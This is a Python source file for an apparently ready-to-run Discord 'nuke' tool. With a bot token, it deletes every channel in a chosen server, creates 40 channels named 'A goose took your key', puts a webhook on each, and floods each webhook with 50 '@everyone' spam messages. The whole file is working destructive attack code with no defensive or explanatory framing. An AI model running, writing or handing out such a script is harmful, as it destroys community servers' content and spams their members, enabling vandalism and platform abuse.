import aiohttp, asyncio, os
from Modules import loadcred
from Modules.loadcred import load_credentials

token = load_credentials()

class Nuke:
    def __init__(self):
        self.token = token
        self.headers = {
            "Authorization": f"Bot {self.token}",
            "Content-Type": "application/json"
        }

    async def fetch_guilds(self):
        async with aiohttp.ClientSession() as session:
            async with session.get("https://discord.com/api/v10/users/@me/guilds", headers=self.headers) as response:
                if response.status == 200:
                    guilds = await response.json()
                    return [{"id": guild["id"], "name": guild["name"]} for guild in guilds]
                else:
                    print(f"Failed to fetch guilds: {response.status} - {await response.text()}")
                    return None

    async def fetch_channels(self, guild_id):
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=self.headers) as response:
                if response.status == 200:
                    channels = await response.json()
                    return [{"id": channel["id"], "name": channel["name"]} for channel in channels]
                else:
                    print(f"Failed to fetch channels for guild {guild_id}: {response.status} - {await response.text()}")
                    return None
    
    async def delete_channel(self, channel_id):
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=self.headers) as response:
                if response.status == 200:
                    print(f"Successfully deleted channel {channel_id}")
                else:
                    print(f"Error: Failed to delete channel {channel_id}. Status: {response.status} - {await response.text()}")
    
    async def create_channel(self, guild_id):
        payload = {
            "name": "A goose took your key",
            "type": 0
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=self.headers, json=payload) as response:
                if response.status == 201:
                    print(f"Successfully created channel")
                    return await response.json()
                else:
                    print(f"Failed to create channel. Status: {response.status} - {await response.text()}")
                    return None
    
    async def create_webhook(self, channel_id):
        payload = {
            "name": "Goose'd"
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=self.headers, json=payload) as response:
                if response.status == 200:
                    webhook = await response.json()
                    print(f"Successfully created webhook in channel {channel_id}")
                    return webhook
                else:
                    print(f"Failed to create webhook. Status: {response.status} - {await response.text()}")
                    return None
    
    async def send_webhook_message(self, webhook_url, message, count):
        payload = {
            "content": message
        }
        async with aiohttp.ClientSession() as session:
            tasks = [session.post(webhook_url, json=payload) for _ in range(count)]
            responses = await asyncio.gather(*tasks)
            for response in responses:
                if response.status == 204:
                    print(f"Successfully sent webhook message to {webhook_url}")
                else:
                    print(f"Failed to send webhook message. Status: {response.status} - {await response.text()}")

class Main:
    def __init__(self):
        self.nuke = Nuke()  

    async def run(self):
        guilds = await self.nuke.fetch_guilds()
        if guilds:
            print("Available guilds:")
            for guild in guilds:
                print(f"Guild ID: {guild['id']}, Name: {guild['name']}")
            
            selected_guild_id = input("Enter Guild ID:")

            selected_guild = next((guild for guild in guilds if guild["id"] == selected_guild_id), None)
            
            if selected_guild:
                channels = await self.nuke.fetch_channels(selected_guild["id"])
                if channels:
                    tasks = []
                    for channel in channels:
                        channel_id = str(channel['id'])
                        print(f"Attempting to delete channel: {channel_id}")
                        tasks.append(self.nuke.delete_channel(channel_id))

                    await asyncio.gather(*tasks)

                    creation_tasks = []
                    for _ in range(40):
                        creation_tasks.append(self.nuke.create_channel(selected_guild["id"]))
                    
                    new_channels = await asyncio.gather(*creation_tasks)

                    webhook_creation_tasks = []
                    for channel in new_channels:
                        if channel:
                            webhook_creation_tasks.append(self.nuke.create_webhook(channel["id"]))

                    webhooks = await asyncio.gather(*webhook_creation_tasks)

                    send_tasks = []
                    for webhook in webhooks:
                        if webhook:
                            webhook_url = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
                            send_tasks.append(self.nuke.send_webhook_message(webhook_url, "@everyone i sharted", 50))

                    await asyncio.gather(*send_tasks)
            else:
                print("Invalid guild ID")

if __name__ == "__main__":
    main = Main()
    asyncio.run(main.run())